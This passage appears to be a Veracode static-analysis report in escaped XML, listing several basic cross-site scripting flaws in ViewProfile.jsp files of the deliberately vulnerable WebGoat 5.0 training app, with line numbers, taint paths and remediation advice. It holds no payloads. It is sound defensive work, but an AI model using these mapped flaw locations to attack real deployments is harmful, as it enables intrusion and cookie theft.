        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getFirstName().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"18\" sourcefilepath=\"/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"16\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"143\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getLastName().
        The tainted data originated from earlier calls to java.sql.statement.executequery,
        javax.servlet.servletrequest.getparameter, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"22\" sourcefilepath=\"/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"21\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"234\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getLastName().
        The tainted data originated from earlier calls to java.sql.statement.executequery,
        javax.servlet.servletrequest.getparameter, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"22\" sourcefilepath=\"/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"21\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"96\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress1().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, javax.servlet.servletrequest.getparametervalues,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"33\" sourcefilepath=\"/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"20\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"212\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress2().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"34\" sourcefilepath=\"/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"25\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"198\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress2().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"34\" sourcefilepath=\"/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"25\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"153\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getAddress2().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"38\" sourcefilepath=\"/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"22\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"54\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPhoneNumber().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"41\" sourcefilepath=\"/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"27\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"211\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPhoneNumber().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"41\" sourcefilepath=\"/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"27\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"81\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPhoneNumber().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"45\" sourcefilepath=\"/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"25\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"99\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getStartDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        javax.servlet.servletrequest.getparametervalues, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile.jsp\" line=\"51\" sourcefilepath=\"/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50withjspwar.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"27\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"210\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.getUserNameInLesson().
        The tainted data originated from an earlier call to java.sql.statement.executequery.
        The tainted data is directed into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"0\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"51\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
